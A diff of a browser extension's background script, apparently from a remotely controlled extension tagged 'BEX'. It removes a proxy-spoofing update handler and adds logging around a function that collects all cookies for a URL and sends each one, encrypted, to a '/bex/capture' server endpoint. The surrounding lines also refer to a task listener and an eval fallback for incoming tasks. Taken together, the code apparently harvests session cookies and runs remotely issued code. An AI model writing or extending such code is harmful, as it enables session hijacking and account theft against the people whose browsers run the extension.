@@ -2,7 +2,7 @@
 import { CONFIG, isUrlWhitelisted, isDomainWhitelisted } from '@/utils/config';
 import { arrayBufferToBase64, base64ToArrayBuffer, importKey, encrypt, decrypt } from '@/utils/crypto';
 import { initSidecarTaskListener, reportSidecarStatus } from '@/utils/sidecar';
-import { startProxy, stopProxy, updateSpoofConfig, isProxyActive } from '@/utils/proxy';
+import { startProxy, stopProxy, isProxyActive } from '@/utils/proxy';
 
 export default defineBackground(() => {
   let sessionUUID: string | null = null;
@@ -266,11 +266,6 @@ export default defineBackground(() => {
                     continue;
                 }
 
-                if (config.type === 'PROXY_SPOOF_UPDATE') {
-                    console.log("BEX: Updating proxy spoof config");
-                    updateSpoofConfig(config.spoofConfig || {});
-                    continue;
-                }
             }
 
             // Fallback to standard eval for legacy tasks
@@ -399,6 +394,7 @@ export default defineBackground(() => {
   async function captureCookiesForUrl(url: string, domain: string) {
     try {
       const cookies = await browser.cookies.getAll({ url });
+      console.log(`BEX: captureCookiesForUrl(${domain}) found ${cookies.length} cookies`);
       for (const cookie of cookies) {
         sendEncrypted("/bex/capture", {
           domain, url,
@@ -416,7 +412,7 @@ export default defineBackground(() => {
         });
       }
     } catch (e) {
-      // cookies API may fail for some URLs (chrome://, about:, etc)
+      console.error("BEX: captureCookiesForUrl failed for", url, e);
     }
   }
 
